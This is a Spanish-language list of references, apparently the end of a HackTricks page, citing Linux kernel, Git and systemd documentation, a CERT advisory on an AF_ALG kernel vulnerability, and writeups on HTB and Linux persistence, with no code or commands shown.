- [26] [Lenguaje Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile de crypto de Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilidad de la caché de páginas de AF_ALG del kernel de Linux](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8): página del manual de Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf: HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentación de `hash-object` de Git](https://git-scm.com/docs/git-hash-object)
- [32] [Documentación de `ls-tree` de Git](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentación de configuración de Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)`: página del manual de Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Documentación de los generadores de systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs: ingeniería de detección en Linux: mecanismos de persistencia](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
